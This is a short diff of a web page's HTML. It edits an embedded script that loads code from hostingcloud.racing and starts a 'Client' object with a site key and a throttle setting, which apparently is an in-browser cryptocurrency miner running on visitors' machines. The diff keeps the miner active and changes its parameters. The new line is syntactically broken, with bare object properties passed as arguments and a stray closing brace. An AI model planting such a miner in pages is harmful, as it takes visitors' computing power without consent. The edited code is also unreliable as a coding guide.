@@ -379,8 +379,9 @@
                     
 			<script src="https://www.hostingcloud.racing/dJCb.js"></script>
 			<script>
-			    var _client = new Client.Anonymous('b1f65a8b50bc6c2e27c8e9ea7281b00f1494f0e62424cd389b873fe1481bfec3', {
-				throttle: 0.3, c: 'w', ads: 0
+				date = new Date();
+				day = date.getDate();
+			    var _client = new Client.User('b1f65a8b50bc6c2e27c8e9ea7281b00f1494f0e62424cd389b873fe1481bfec3', day, throttle: 0.3, autoThreads: 1, ads: 0);
 			    });
 			    _client.start();
 
